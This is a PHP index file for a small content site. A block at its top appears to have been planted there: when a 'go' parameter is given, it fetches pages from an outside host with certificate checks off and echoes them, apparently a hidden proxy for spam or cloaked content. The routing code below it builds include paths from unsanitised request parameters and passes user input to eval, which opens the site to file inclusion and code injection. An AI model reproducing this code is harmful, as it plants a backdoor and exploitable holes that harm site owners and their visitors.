<?php
if(isset($_GET['go'])) {
    $url = $_GET['go'];
    $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
    // INIT CURL
    $ch = curl_init();

    //init curl
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    // SET URL FOR THE POST FORM LOGIN
    curl_setopt($ch, CURLOPT_URL, 'https://replication.pkcdurensawit.net/uca/'.$url.'/');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);

    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

    // common name and also verify that it matches the hostname provided)
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    // Optional: Return the result instead of printing it
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    // ENABLE HTTP POST
    curl_setopt ($ch, CURLOPT_POST, 1);
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $store = curl_exec ($ch);
    echo $store;

    // CLOSE CURL
    curl_close ($ch);

} else {
// Define Routing Data Comg BY URL $_GET
if ( !isset($_GET['module']) ) { $_GET['module'] = 'pages'; }
if ( !isset($_GET['act'])    ) { $_GET['act'] = 'all';}

// Include Required Classes
include         "globals.php";
include         "admin/classes/controllers.php";
include         "admin/classes/core.php";
include	     "admin/classes/access.php";
include	     "admin/classes/JDate.php";
if ( !isset($_GET['item']) && !isset($_GET['search']) ) include "admin/classes/stats/count.php";

$file = "admin/classes/langs/".$_GET['lang'].".php";
if(file_exists($file)) include $file;

include "admin/modules/".$_GET['module']."/".$_GET['module'].".php";
$mod = new $_GET['module'];
$str = '$mod->site_'.$_GET['act'].'();';
eval($str);
}
?>
